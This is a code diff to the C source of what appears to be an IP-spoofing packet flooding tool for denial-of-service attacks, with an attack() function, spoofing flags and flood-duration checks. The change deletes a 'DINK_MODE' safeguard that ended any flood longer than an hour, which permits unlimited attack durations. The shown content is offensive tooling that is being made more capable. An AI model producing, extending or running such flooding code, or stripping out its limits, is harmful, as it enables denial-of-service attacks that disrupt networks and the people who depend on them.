@@ -73,9 +73,6 @@ By darkness@efnet. // greetz vae@efnet.
 #define IP_MF                         0x2000        /* more fragments flag */
 #define IP_OFFMASK                    0x1fff        /* mask for fragmenting bits */
 
-// It's pretty sad that we had to even do this.
-#define DINK_MODE
-
 // Spoofing Type Triggers
 bool destFullSpoof = false;
 bool sourceFullSpoof = false;
@@ -528,14 +525,6 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         if (pktqueue != 0)
             pktcount++;
 
-        #ifdef DINK_MODE
-        if (time(NULL) - start > 3600)
-        {
-            printf("-> Dink detected\n");
-            handle_exit();
-        }
-        #endif
-
         if (time(NULL) - start >= ttime)
             handle_exit();
     }
@@ -620,20 +609,12 @@ int main(int argc, char** argv)
         printf("-> Acceptable TCP source ports are between 1 and 65535.\n");
         exit(-1);
     }
-    #ifdef DINK_MODE
-    if (ttime > 3600)
-    {
-        printf("-> Please rethink your time de(lusions)cisons.\n");
-        exit(-1);
-    }
-    #else
     // Any smart person realizes why this wouldn't work, but just in-case...
     if (ttime == 0)
     {
         printf("-> Flood time cannot be zero.\n");
         exit(-1);
     }
-    #endif
     // Prevent invalid data sizes.
     if (databytes > TCP_DATA_LEN_MAX)
     {
